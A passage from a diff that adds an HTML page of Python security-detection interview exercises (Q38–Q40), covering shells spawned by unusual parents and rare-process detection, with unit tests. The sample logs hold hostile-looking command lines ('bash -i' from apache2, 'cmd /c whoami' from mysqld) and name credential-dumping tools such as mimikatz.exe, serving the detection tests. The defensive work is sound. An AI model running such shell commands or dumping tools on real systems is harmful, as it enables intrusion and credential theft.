+    assert (&quot;winword.exe&quot;, &quot;cmd.exe&quot;) in combos
+    assert (&quot;excel.exe&quot;, &quot;powershell.exe&quot;) in combos
+    assert (&quot;explorer.exe&quot;, &quot;chrome.exe&quot;) not in combos
+    print(&quot;Q38 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q39 — Detect Process Spawning Shell
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Given process creation logs, flag any non-shell process that spawns
+  cmd.exe, bash, sh, zsh, or powershell — especially with suspicious flags.
+
+Clarifying questions:
+  1. Should we allow known-good parents (e.g., terminal emulators)?
+  2. Are we on Windows or Linux or both?
+  3. Should flags like -i (interactive) or -c (exec string) affect the alert?
+
+Security angle:
+  Web shells, malware, and exploited services will often spawn a shell to
+  give the attacker interactive access. Detecting ANY unexpected process
+  spawning a shell is a high-fidelity alert in a baseline-aware environment.
+  Look especially at: web servers (nginx, apache, iis), databases (mysqld, sqlservr),
+  and document processors.
+&quot;&quot;&quot;
+
+SHELL_PROCESSES = frozenset({
+    &quot;cmd.exe&quot;, &quot;powershell.exe&quot;, &quot;pwsh.exe&quot;,
+    &quot;bash&quot;, &quot;sh&quot;, &quot;zsh&quot;, &quot;ksh&quot;, &quot;dash&quot;,
+})
+
+TRUSTED_SHELL_PARENTS = frozenset({
+    &quot;explorer.exe&quot;, &quot;wt.exe&quot;, &quot;conhost.exe&quot;,
+    &quot;terminal&quot;, &quot;xterm&quot;, &quot;gnome-terminal&quot;, &quot;konsole&quot;,
+    &quot;sshd&quot;, &quot;login&quot;, &quot;su&quot;, &quot;sudo&quot;,
+})
+
+
+def detect_process_spawning_shell(logs: List[Dict]) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: check if child is a shell AND parent is not in trusted set.
+    O(n) time, O(1) lookup with frozenset.
+    &quot;&quot;&quot;
+    alerts = []
+    for log in logs:
+        parent = (log.get(&quot;parent_process&quot;) or &quot;&quot;).lower().strip()
+        child = (log.get(&quot;process_name&quot;) or &quot;&quot;).lower().strip()
+
+        if child in SHELL_PROCESSES and parent not in TRUSTED_SHELL_PARENTS:
+            alerts.append({
+                &quot;host&quot;: log.get(&quot;host&quot;),
+                &quot;parent&quot;: parent,
+                &quot;child&quot;: child,
+                &quot;pid&quot;: log.get(&quot;pid&quot;),
+                &quot;command_line&quot;: (log.get(&quot;command_line&quot;) or &quot;&quot;)[:200],
+                &quot;ts&quot;: log.get(&quot;ts&quot;),
+            })
+    return alerts
+
+
+def test_q39():
+    logs = [
+        # Web shell: apache spawns bash
+        {&quot;host&quot;: &quot;web-01&quot;, &quot;pid&quot;: 800, &quot;parent_process&quot;: &quot;apache2&quot;,
+         &quot;process_name&quot;: &quot;bash&quot;, &quot;command_line&quot;: &quot;bash -i&quot;, &quot;ts&quot;: &quot;T1&quot;},
+        # Malware: mysqld spawns cmd
+        {&quot;host&quot;: &quot;db-01&quot;, &quot;pid&quot;: 900, &quot;parent_process&quot;: &quot;mysqld&quot;,
+         &quot;process_name&quot;: &quot;cmd.exe&quot;, &quot;command_line&quot;: &quot;cmd /c whoami&quot;, &quot;ts&quot;: &quot;T2&quot;},
+        # Legitimate: user opening terminal
+        {&quot;host&quot;: &quot;ws-01&quot;, &quot;pid&quot;: 200, &quot;parent_process&quot;: &quot;explorer.exe&quot;,
+         &quot;process_name&quot;: &quot;cmd.exe&quot;, &quot;command_line&quot;: &quot;cmd.exe&quot;, &quot;ts&quot;: &quot;T3&quot;},
+    ]
+    results = detect_process_spawning_shell(logs)
+    combos = {(r[&quot;parent&quot;], r[&quot;child&quot;]) for r in results}
+    assert (&quot;apache2&quot;, &quot;bash&quot;) in combos
+    assert (&quot;mysqld&quot;, &quot;cmd.exe&quot;) in combos
+    assert (&quot;explorer.exe&quot;, &quot;cmd.exe&quot;) not in combos
+    print(&quot;Q39 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q40 — Detect Rare Process Execution
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Given a baseline of frequently seen processes and a new set of process
+  creation events, return processes that did NOT appear in the baseline.
+  &quot;Rare&quot; = not seen in the last N days of normal activity.
+
+Clarifying questions:
+  1. Is the baseline per-host or organisation-wide?
+  2. Should we exclude system processes (PID &lt; 10)?
+  3. How do we handle processes with dynamic paths (e.g., temp folders)?
+  4. Should we also flag processes run from unusual directories?
+
+Security angle:
+  Attackers drop binaries with novel names to blend in. A process name not
+  seen in the historical baseline is an anomaly worth investigating.
+  This is the &quot;process allow-list&quot; detection model used by CrowdStrike Falcon
+  and Carbon Black. Paths matter as much as names — calc.exe in C:/Temp/ is
+  not the same as C:/Windows/System32/calc.exe.
+&quot;&quot;&quot;
+
+
+def detect_rare_process_execution(
+    baseline: Set[str],
+    new_events: List[Dict],
+    use_full_path: bool = False,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: normalise baseline once to frozenset; single scan of events.
+    O(n) time, O(b) space for baseline.
+
+    Data structure: frozenset for O(1) membership check.
+    &quot;&quot;&quot;
+    known = frozenset(p.lower() for p in baseline)
+    seen_new: Dict[str, Dict] = {}
+
+    for event in new_events:
+        path = (event.get(&quot;process_path&quot;) or event.get(&quot;process_name&quot;) or &quot;&quot;).lower()
+        name = path.split(&quot;\\&quot;)[-1].split(&quot;/&quot;)[-1] if not use_full_path else path
+
+        key = path if use_full_path else name
+        if key and key not in known and key not in seen_new:
+            seen_new[key] = {
+                &quot;process&quot;: key,
+                &quot;host&quot;: event.get(&quot;host&quot;),
+                &quot;full_path&quot;: event.get(&quot;process_path&quot;),
+                &quot;first_seen_ts&quot;: event.get(&quot;ts&quot;),
+            }
+
+    return list(seen_new.values())
+
+
+def test_q40():
+    baseline = {
+        &quot;chrome.exe&quot;, &quot;explorer.exe&quot;, &quot;svchost.exe&quot;,
+        &quot;notepad.exe&quot;, &quot;cmd.exe&quot;, &quot;powershell.exe&quot;,
+    }
+    new_events = [
+        {&quot;host&quot;: &quot;ws-01&quot;, &quot;process_name&quot;: &quot;chrome.exe&quot;,            &quot;ts&quot;: &quot;T1&quot;},
+        {&quot;host&quot;: &quot;ws-01&quot;, &quot;process_name&quot;: &quot;mimikatz.exe&quot;,          &quot;ts&quot;: &quot;T2&quot;},
+        {&quot;host&quot;: &quot;ws-02&quot;, &quot;process_name&quot;: &quot;procdump64.exe&quot;,        &quot;ts&quot;: &quot;T3&quot;},
+        {&quot;host&quot;: &quot;ws-02&quot;, &quot;process_name&quot;: &quot;notepad.exe&quot;,           &quot;ts&quot;: &quot;T4&quot;},  # known
+    ]
+    results = detect_rare_process_execution(baseline, new_events)
+    proc_names = {r[&quot;process&quot;] for r in results}
+    assert &quot;mimikatz.exe&quot; in proc_names
+    assert &quot;procdump64.exe&quot; in proc_names
+    assert &quot;chrome.exe&quot; not in proc_names
+    assert &quot;notepad.exe&quot; not in proc_names
+    print(&quot;Q40 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Run all tests
+# ─────────────────────────────────────────────────────────────────────────────
+if __name__ == &quot;__main__&quot;:
+    test_q31()
+    test_q32()
+    test_q33()
+    test_q34()
+    test_q35()
+    test_q36()
+    test_q37()
+    test_q38()
+    test_q39()
+    test_q40()
+    print(&quot;\nAll Q31–Q40 tests passed ✓&quot;)
+</code></pre>
+</body>
+</html>
